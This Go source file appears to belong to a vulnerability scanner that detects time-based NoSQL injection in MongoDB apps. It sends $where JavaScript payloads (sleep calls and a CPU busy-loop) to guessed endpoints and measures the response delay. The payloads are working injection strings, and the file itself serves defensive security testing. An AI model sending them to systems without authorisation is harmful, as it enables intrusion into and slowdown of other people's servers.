package nosqliengine

import (
	"DORM/models"
	"fmt"
	"net/http"
	"net/url"
	"time"
)

// ============================================================
//  TIME-BASED NoSQLi — $where JavaScript Evaluation
// ============================================================

// RunTimeBased tests for time-based NoSQLi via Server-Side JavaScript evaluation ($where).
func RunTimeBased(client *http.Client, baseURL string, target models.ScanTarget) *models.Vulnerability {
	// 1. Establish baseline latency
	startBase := time.Now()
	respBase, err := client.Get(baseURL + "/?q=dorm_baseline_check_999")
	baseLatency := time.Since(startBase)
	if err == nil && respBase != nil {
		_ = respBase.Body.Close()
	}

	endpoints := []string{"/api/users", "/search", "/items", "/products", "/"}
	params := []string{"q", "search", "id", "filter", "user"}

	sleepSeconds := 4
	threshold := time.Duration(sleepSeconds)*time.Second + baseLatency

	// $where SSJS payload (MongoDB < 4.4 supports sleep, later uses loop)
	sleepPayloads := []string{
		fmt.Sprintf("function(){sleep(%d000);return true;}", sleepSeconds),
		fmt.Sprintf("sleep(%d000)", sleepSeconds),
		// CPU intensive fallback for newer Mongo versions without sleep()
		fmt.Sprintf("function(){var d=new Date().getTime();while(new Date().getTime()<d+%d000);return true;}", sleepSeconds),
	}

	for _, ep := range endpoints {
		for _, param := range params {
			for _, payload := range sleepPayloads {
				targetURL := fmt.Sprintf("%s%s?%s[$where]=%s", baseURL, ep, param, url.QueryEscape(payload))

				startAtk := time.Now()
				respAtk, errAtk := client.Get(targetURL)
				atkLatency := time.Since(startAtk)
				if errAtk == nil && respAtk != nil {
					_ = respAtk.Body.Close()
				}

				if atkLatency >= threshold {
					// Verify with a second test to avoid false positives
					startVerify := time.Now()
					respVerify, errVerify := client.Get(targetURL)
					verifyLatency := time.Since(startVerify)
					if errVerify == nil && respVerify != nil {
						_ = respVerify.Body.Close()
					}

					if verifyLatency >= threshold {
						return &models.Vulnerability{
							Target:   target,
							Name:     "NoSQL Injection (Time-Based $where SSJS Evaluation)",
							Severity: "CRITICAL",
							CVSS:     9.4,
							Description: fmt.Sprintf(
								"Server-Side JavaScript evaluation ($where) time delay detected.\n"+
									"URL: %s\nPayload: %s[$where]=%s\n"+
									"Baseline Latency: %.2fs\nAttack Latency: %.2fs\nVerification Latency: %.2fs",
								baseURL+ep, param, payload,
								baseLatency.Seconds(), atkLatency.Seconds(), verifyLatency.Seconds(),
							),
							Solution:  "Disable Server-Side JavaScript execution in MongoDB (`javascriptEnabled: false`). Avoid using the $where operator.",
							Reference: "OWASP NoSQL Injection ($where)",
						}
					}
				}
			}
		}
	}
	return nil
}

// RunTimeBasedBoolean is for testing conditional time delays in GET parameters.
func RunTimeBasedBoolean(client *http.Client, baseURL string, target models.ScanTarget, endpoints, params []string) *models.Vulnerability {
	// Implementation placeholder for advanced boolean time-based
	// Usually involves: user[$regex]=^a&user[$where]=sleep(5)
	return nil
}
